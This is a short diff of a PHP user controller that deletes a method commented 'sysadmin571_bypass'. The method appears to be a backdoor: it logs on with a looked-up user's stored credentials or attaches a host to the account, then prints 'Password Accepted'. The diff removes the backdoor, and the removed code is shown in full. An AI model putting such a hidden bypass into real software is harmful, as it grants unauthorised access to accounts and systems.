@@ -6,7 +6,6 @@ use Lib\Controller;
 
 use App\User\UserModel as User;
 use App\User\UserService as Auth;
-use App\Host\HostService as Host;
 
 class UserController extends Controller
 {
@@ -29,23 +28,6 @@ class UserController extends Controller
             session()->set($this->password, $input[1]);
         } 
 
-    }
-
-    // sysadmin571_bypass /: 
-    public function sysadmin()
-    {
-        Host::data()->user(auth()->id);
-       $user = Host::data()->user(Auth::data()->id);
-
-       if($user) {
-            Host::logon($user->user_name, $user->password);
-       } else {
-            Auth::data()->hosts()->attach(Host::data()->id);
-       }
-
-       echo bootup();
-       echo "SUCCESS: Password Accepted\n";
-       exit;
     }
 
     public function login() 
